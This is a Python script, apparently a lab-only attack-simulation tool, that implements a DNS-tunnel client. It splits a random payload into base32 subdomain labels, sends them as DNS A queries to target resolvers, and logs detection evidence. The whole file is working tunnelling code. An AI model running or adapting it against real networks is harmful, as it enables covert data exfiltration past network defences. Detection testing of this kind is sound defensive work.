#!/usr/bin/env python3
"""
Stellar PoC — DNS Tunnel file client (lab-only).
Sends real UDP/53 DNS A queries with strt/idx-*/end session FQDNs.
"""
from __future__ import annotations

import argparse
import base64
import os
import random
import socket
import struct
import sys
import time
from typing import Iterator, List, Optional, Tuple

DNS_TUNNEL_DOMAIN_DEFAULT = "dns-tunnel.com"
CHUNK_SIZE_DEFAULT = 30
PAYLOAD_MB_DEFAULT = 2.0
DURATION_SEC_DEFAULT = 180
SLEEP_MIN = 0.002
SLEEP_MAX = 0.02
QTYPE_A = 1
RECV_TIMEOUT = 0.05
PROGRESS_INTERVAL = 5000
EVENT_LOG_INTERVAL = 5000
TSV_HEADER = (
    "timestamp\trun_id\tmodule\tstage\ttarget\taction\tartifact\t"
    "status\texit_code\tevidence_value\tsource\n"
)
QTYPE_NAMES = {QTYPE_A: "A", 16: "TXT"}


def encode_qname(fqdn: str) -> bytes:
    out = bytearray()
    for part in fqdn.lower().split("."):
        if not part or len(part) > 63:
            raise ValueError(f"invalid label in {fqdn}")
        out.append(len(part))
        out.extend(part.encode("ascii"))
    out.append(0)
    return bytes(out)


def build_dns_query(fqdn: str, qtype: int = QTYPE_A) -> Tuple[int, bytes]:
    txn_id = random.randint(0, 65535)
    header = struct.pack("!HHHHHH", txn_id, 0x0100, 1, 0, 0, 0)
    question = encode_qname(fqdn) + struct.pack("!HH", qtype, 1)
    return txn_id, header + question


def parse_dns_response(packet: bytes) -> str:
    if len(packet) < 12:
        return "error"
    flags = struct.unpack("!H", packet[2:4])[0]
    rcode = flags & 0x0F
    ancount = struct.unpack("!H", packet[6:8])[0]
    if rcode == 3:
        return "nxdomain"
    if rcode == 0 and ancount > 0:
        return "resolved"
    if rcode == 0:
        return "noanswer"
    return "error"


def chunk_to_b32_label(chunk: bytes) -> str:
    return base64.b32encode(chunk).decode("ascii").lower().rstrip("=")


def plan_idx_count(payload_mb: float, chunk_size: int) -> int:
    total = int(payload_mb * 1024 * 1024)
    return max(1, (total + chunk_size - 1) // chunk_size)


def clamp_duration_sec(duration_sec: float) -> float:
    return max(120.0, min(240.0, float(duration_sec)))


def compute_sleep_interval(total_chunks: int, duration_sec: float) -> float:
    if total_chunks < 1:
        return SLEEP_MIN
    raw = duration_sec / total_chunks
    return max(SLEEP_MIN, min(SLEEP_MAX, raw))


def iter_fixed_payload_chunks(payload_mb: float, chunk_size: int) -> Iterator[bytes]:
    total = int(payload_mb * 1024 * 1024)
    if total < chunk_size:
        total = chunk_size
    produced = 0
    while produced < total:
        need = min(chunk_size, total - produced)
        yield os.urandom(need)
        produced += need


def new_session_id() -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(6))


def iso_ts() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def log_line(msg: str) -> None:
    print(msg, flush=True)


def log_block(tag: str, fields: dict) -> None:
    log_line(tag)
    for key, value in fields.items():
        log_line(f"{key}={value}")


def parse_targets(raw: str) -> List[str]:
    out: List[str] = []
    for part in (raw or "").split(","):
        ip = part.strip()
        if not ip:
            continue
        try:
            socket.inet_aton(ip)
        except OSError:
            continue
        if ip not in out:
            out.append(ip)
    return out


class DnsEventWriter:
    def __init__(self, path: Optional[str], source: str = "dns_tunnel_file_client") -> None:
        self.path = (path or "").strip() or None
        self.source = source
        self._fh = None
        self.rows = 0
        self.idx_pattern_count = 0
        self.label_len_sum = 0
        self.label_len_n = 0

    def _emit_event_written(self) -> None:
        if not self.path:
            return
        log_block("DNS_EVENT_WRITTEN", {"event_file": self.path, "row_count": self.rows})

    def bootstrap(self, run_id: str, domain: str) -> None:
        if not self.path:
            return
        parent = os.path.dirname(self.path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        ts = iso_ts()
        evidence = f"start|{domain}|{run_id}"
        with open(self.path, "w", encoding="utf-8") as fh:
            fh.write(TSV_HEADER)
            fh.write(
                f"{ts}\t{run_id}\tDNS_TUNNEL\tdns_tunnel_file_client\t-\tmeta\t"
                f"start\tmeta\t0\t{evidence}\t{self.source}\n"
            )
            fh.flush()
            os.fsync(fh.fileno())
        self._fh = open(self.path, "a", encoding="utf-8")
        self.rows = 1
        self._emit_event_written()

    def close(self) -> None:
        if self._fh:
            self._fh.flush()
            os.fsync(self._fh.fileno())
            self._fh.close()
            self._fh = None
            self._emit_event_written()

    def append(
        self,
        run_id: str,
        target: str,
        fqdn: str,
        session_id: str,
        seq: str,
        payload_length: int,
        status: str,
        bytes_encoded: int = 0,
    ) -> None:
        if not self._fh:
            return
        ts = iso_ts()
        evidence = f"{fqdn}|A|{session_id}|{seq}|{payload_length}|{bytes_encoded}"
        row = (
            f"{ts}\t{run_id}\tDNS_TUNNEL\tdns_tunnel_file_client\t{target}\tquery\t"
            f"fqdn\t{status}\t0\t{evidence}\t{self.source}\n"
        )
        self._fh.write(row)
        self.rows += 1
        if self.rows == 2 or self.rows % EVENT_LOG_INTERVAL == 0:
            self._emit_event_written()
        lbl = fqdn.split(".", 1)[0] if fqdn else ""
        if lbl.startswith("idx-"):
            self.idx_pattern_count += 1
            pl = payload_length
            if pl > 0:
                self.label_len_sum += pl
                self.label_len_n += 1

    def avg_label_length(self) -> int:
        if self.label_len_n < 1:
            return 0
        return int(self.label_len_sum / self.label_len_n)


def open_udp_socket() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(RECV_TIMEOUT)
    return sock


def send_dns_query(
    sock: Optional[socket.socket],
    resolver: str,
    fqdn: str,
    dry_run: bool,
    qtype: int = QTYPE_A,
    log_detail: bool = True,
) -> Tuple[bool, str]:
    qtype_name = QTYPE_NAMES.get(qtype, str(qtype))
    if log_detail:
        log_block(
            "DNS_QUERY_SENT",
            {"resolver": resolver, "fqdn": fqdn, "type": qtype_name},
        )
    if dry_run:
        if log_detail:
            log_block(
                "DNS_QUERY_RESPONSE",
                {"resolver": resolver, "fqdn": fqdn, "type": qtype_name, "result": "dry_run"},
            )
        return True, "dry_run"

    assert sock is not None
    txn_id, packet = build_dns_query(fqdn, qtype)
    try:
        sock.sendto(packet, (resolver, 53))
    except OSError:
        return False, "send_error"

    result = "sent"
    try:
        data, _addr = sock.recvfrom(4096)
        if len(data) >= 2 and struct.unpack("!H", data[0:2])[0] == txn_id:
            result = parse_dns_response(data)
        else:
            result = "error"
    except socket.timeout:
        result = "timeout"
    except OSError:
        result = "error"

    if log_detail:
        log_block(
            "DNS_QUERY_RESPONSE",
            {"resolver": resolver, "fqdn": fqdn, "type": qtype_name, "result": result},
        )
    return True, result


def run_target(
    target: str,
    run_id: str,
    domain: str,
    chunks: List[bytes],
    payload_mb: float,
    duration_sec: float,
    writer: DnsEventWriter,
    dry_run: bool,
    max_sent: Optional[int],
    sample_holder: dict,
    stats: dict,
) -> Tuple[int, int, float]:
    session_id = new_session_id()
    total_chunks = len(chunks)
    sleep_iv = compute_sleep_interval(total_chunks, duration_sec)
    sent = 0
    bytes_encoded = 0
    sendto_ok = 0
    response_ok = 0
    sock: Optional[socket.socket] = None
    if not dry_run:
        sock = open_udp_socket()

    log_line(
        f"DNS_TUNNEL_FILE_CLIENT_START target={target} payload_mb={payload_mb} "
        f"duration_sec={int(duration_sec)} chunks={total_chunks} sleep_interval={sleep_iv:.6f}"
    )

    t0 = time.monotonic()
    strt_fq = f"strt-{session_id}.{domain}"
    ok, result = send_dns_query(sock, target, strt_fq, dry_run, log_detail=True)
    if ok:
        sendto_ok += 1
        if result not in ("send_error", "error"):
            response_ok += 1
    writer.append(run_id, target, strt_fq, session_id, "0", 0, "sent" if ok else "error", 0)
    sent += 1

    for idx, chunk in enumerate(chunks, start=1):
        if max_sent is not None and sent >= max_sent:
            break
        b32 = chunk_to_b32_label(chunk)
        fqdn = f"idx-{idx:06d}-{b32}.{domain}"
        plen = len(b32)
        ok, result = send_dns_query(sock, target, fqdn, dry_run, log_detail=(idx == 1))
        if ok:
            sendto_ok += 1
            if result not in ("send_error", "error"):
                response_ok += 1
        writer.append(
            run_id, target, fqdn, session_id, str(idx), plen,
            "sent" if ok else "error", len(chunk),
        )
        sent += 1
        bytes_encoded += len(chunk)
        if idx == 1 and "sample" not in sample_holder:
            sample_holder["sample"] = fqdn
            log_line(f"DNS_TUNNEL_PACKET_EVIDENCE sample_fqdn={fqdn}")
        if sent % PROGRESS_INTERVAL == 0:
            log_line(f"DNS_TUNNEL_FILE_CLIENT_PROGRESS target={target} sent={sent}")
        if sleep_iv > 0:
            time.sleep(sleep_iv)

    end_fq = f"end-{session_id}.{domain}"
    ok, result = send_dns_query(sock, target, end_fq, dry_run, log_detail=True)
    if ok:
        sendto_ok += 1
        if result not in ("send_error", "error"):
            response_ok += 1
    writer.append(run_id, target, end_fq, session_id, "end", 0, "sent" if ok else "error", 0)
    sent += 1
    elapsed = time.monotonic() - t0

    stats["sent"] += sent
    stats["sendto_ok"] += sendto_ok
    stats["response_count"] += response_ok
    stats["bytes_encoded"] += bytes_encoded

    log_line(
        f"DNS_TUNNEL_FILE_CLIENT_DONE target={target} sent={sent} sendto_success={sendto_ok} "
        f"response_count={response_ok} bytes_encoded={bytes_encoded} duration_sec={elapsed:.2f} "
        f"avg_label_length={writer.avg_label_length()}"
    )
    if sock:
        sock.close()
    return sent, bytes_encoded, elapsed


def run_client(args: argparse.Namespace) -> int:
    targets = parse_targets(args.targets)
    if not targets:
        log_line("DNS_TUNNEL_FILE_CLIENT_ENV failure=no_targets")
        return 2

    payload_mb = args.payload_mb
    chunk_size = args.chunk_size
    duration_sec = clamp_duration_sec(args.duration_sec)
    dry_run = args.dry_run_sot
    max_sent = args.max_sent
    domain = args.domain
    run_id = args.run_id
    event_file = args.event_file

    chunks = list(iter_fixed_payload_chunks(payload_mb, chunk_size))
    total_chunks = len(chunks)
    generated_queries = total_chunks + 2
    sleep_iv = compute_sleep_interval(total_chunks, duration_sec)

    log_block(
        "DNS_TUNNEL_START",
        {
            "targets": ",".join(targets),
            "domain": domain,
            "payload_mb": payload_mb,
            "chunk_size": chunk_size,
            "generated_queries": generated_queries,
            "duration_sec": duration_sec,
            "dry_run": int(dry_run),
            "run_id": run_id,
            "event_file": event_file or "none",
        },
    )
    log_line(f"DNS_TUNNEL_TARGET_SELECTED count={len(targets)} targets={','.join(targets)}")
    log_line(
        f"DNS_TUNNEL_FILE_CLIENT_PLAN targets={len(targets)} payload_mb={payload_mb} "
        f"chunk_size={chunk_size} total_chunks={total_chunks} duration_sec={duration_sec} "
        f"sleep_interval={sleep_iv:.6f} dry_run={int(dry_run)} run_id={run_id}"
    )

    writer = DnsEventWriter(event_file)
    if event_file:
        writer.bootstrap(run_id, domain)

    sample_holder: dict = {}
    stats = {"sent": 0, "sendto_ok": 0, "response_count": 0, "bytes_encoded": 0}
    per_target_stats: List[Tuple[str, int, int, float]] = []

    for target in targets:
        s, b, elapsed = run_target(
            target,
            run_id,
            domain,
            chunks,
            payload_mb,
            duration_sec,
            writer,
            dry_run,
            max_sent,
            sample_holder,
            stats,
        )
        per_target_stats.append((target, s, b, elapsed))

    writer.close()

    max_elapsed = max((elapsed for _, _, _, elapsed in per_target_stats), default=0.0)
    event_count = writer.rows

    log_block(
        "DNS_TUNNEL_EXECUTION_SUMMARY",
        {
            "generated_queries": generated_queries * len(targets),
            "sent_queries": stats["sent"],
            "response_count": stats["response_count"],
            "event_count": event_count,
            "sendto_success": stats["sendto_ok"],
            "targets": len(targets),
            "bytes_encoded": stats["bytes_encoded"],
            "duration_sec": f"{max_elapsed:.2f}",
            "event_file": event_file or "none",
            "sample_fqdn": sample_holder.get("sample", "none"),
        },
    )

    log_line(
        f"DNS_TUNNEL_FILE_CLIENT_SUMMARY targets={len(targets)} total_sent={stats['sent']} "
        f"total_bytes_encoded={stats['bytes_encoded']} idx_pattern_count={writer.idx_pattern_count} "
        f"avg_label_length={writer.avg_label_length()} duration_sec={max_elapsed:.2f} "
        f"sendto_success={stats['sendto_ok']} response_count={stats['response_count']} "
        f"event_count={event_count} sample_fqdn={sample_holder.get('sample', 'none')}"
    )
    return 0 if stats["sent"] > 0 else 1


def args_from_env() -> Optional[argparse.Namespace]:
    targets = os.environ.get("DNS_TUNNEL_TARGETS", "").strip()
    if not targets:
        return None
    ns = argparse.Namespace()
    ns.targets = targets
    ns.run_id = os.environ.get("DNS_TUNNEL_RUN_ID", "run")
    ns.domain = os.environ.get("DNS_TUNNEL_DOMAIN", DNS_TUNNEL_DOMAIN_DEFAULT)
    ns.payload_mb = float(os.environ.get("DNS_TUNNEL_PAYLOAD_MB", str(PAYLOAD_MB_DEFAULT)))
    ns.chunk_size = int(os.environ.get("DNS_TUNNEL_CHUNK_SIZE", str(CHUNK_SIZE_DEFAULT)))
    ns.duration_sec = float(os.environ.get("DNS_TUNNEL_DURATION_SEC", str(DURATION_SEC_DEFAULT)))
    ns.dry_run_sot = os.environ.get("DNS_TUNNEL_DRY_RUN_SOT", "").lower() in ("1", "yes", "true")
    ns.max_sent = int(os.environ["DNS_TUNNEL_MAX_SENT"]) if os.environ.get("DNS_TUNNEL_MAX_SENT") else None
    ns.event_file = os.environ.get("DNS_TUNNEL_EVENT_FILE", "").strip() or None
    return ns


def main() -> int:
    env_args = args_from_env()
    if env_args is not None:
        args = env_args
    else:
        p = argparse.ArgumentParser(description="DNS Tunnel file client (UDP/53 sendto)")
        p.add_argument("--targets", required=True, help="Comma-separated target IPs (alive hosts)")
        p.add_argument("--run-id", default="run")
        p.add_argument("--domain", default=DNS_TUNNEL_DOMAIN_DEFAULT)
        p.add_argument("--payload-mb", type=float, default=PAYLOAD_MB_DEFAULT)
        p.add_argument("--chunk-size", type=int, default=CHUNK_SIZE_DEFAULT)
        p.add_argument("--duration-sec", type=float, default=DURATION_SEC_DEFAULT)
        p.add_argument("--dry-run-sot", action="store_true", help="Write events without UDP sendto")
        p.add_argument("--max-sent", type=int, default=0, help="Cap sends per target (0=all)")
        p.add_argument("--event-file", default="", help="Append query events to TSV path")
        args = p.parse_args()
        args.max_sent = args.max_sent if args.max_sent > 0 else None
        args.event_file = (args.event_file or "").strip() or None

    return run_client(args)


if __name__ == "__main__":
    sys.exit(main())
